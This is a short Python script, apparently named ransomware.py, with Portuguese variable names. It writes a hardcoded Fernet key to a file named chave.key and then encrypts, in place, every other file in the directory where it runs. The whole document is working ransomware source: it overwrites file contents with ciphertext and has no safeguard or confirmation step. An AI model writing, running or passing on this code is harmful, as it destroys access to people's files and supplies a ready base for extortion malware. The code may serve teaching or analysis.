import os
from cryptography.fernet import Fernet

files = []

with open("chave.key", "wb") as chave:
    chave.write(b'axHGvWQQgWWIn30w-2nUW9VU5bcyfAk1-KYDsn4ovFo=')

for file in os.listdir():
    if file =="ransomware.py" or file == "chave.key":  
        continue
    if os.path.isfile(file):
        files.append(file)
 
for file in files:
    with open(file, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(b'axHGvWQQgWWIn30w-2nUW9VU5bcyfAk1-KYDsn4ovFo=').encrypt(conteudo)
    with open(file, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)
